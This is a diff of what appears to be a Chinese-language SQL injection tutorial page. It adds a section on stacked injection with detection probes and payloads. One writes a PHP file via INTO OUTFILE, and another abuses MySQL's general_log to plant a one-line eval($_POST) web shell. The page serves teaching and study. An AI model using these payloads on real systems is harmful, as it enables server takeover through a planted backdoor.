@@ -138,7 +138,18 @@ group_concat()            <span class="pl-c"><span class="pl-c">#</span> 把数�
 接下来介绍堆叠注入。<br>
 有如下的例子：</p>
 <div class="highlight highlight-source-sql"><pre class="notranslate"> <span class="pl-k">select</span> phone,e_mail <span class="pl-k">from</span> guests;<span class="pl-k">select</span> username,password <span class="pl-k">from</span> users;</pre></div>
-<p>可以发现，在样例中，在一行里嵌套了两条语句，也就是说，在实战之中，我们将语句连起来执行</p></div>
+<p>可以发现，在样例中，在一行里嵌套了两条语句，也就是说，在实战之中，我们将语句连起来执行了，因此，我们将不止是可以进行查询操作，而是更进一步能实现修改，增加，删除的操作，因而，我们可以使用这一漏洞实现木马的写入。<br>
+样例：</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;?php phpinfo();?&gt;<span class="pl-pds">"</span></span> into outfile <span class="pl-s"><span class="pl-pds">"</span>/tmp/1.php<span class="pl-pds">"</span></span>；</pre></div>
+<p>但是，通常情况之下secure_file_priv 被设置为NULL，那么是否是无法利用了？<br>
+这里，我们引入堆叠注入<br>
+堆叠注入的判断方法：<br>
+名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入<br>
+参考的使用方法：</p>
+<pre class="notranslate"><code class="notranslate">set global general_log=on;#开启日志记录
+set global general_log_file='C:/1.php';#设置日志保存路径
+select '&lt;?php eval($_POST['a']) ?&gt;';#写入木马
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
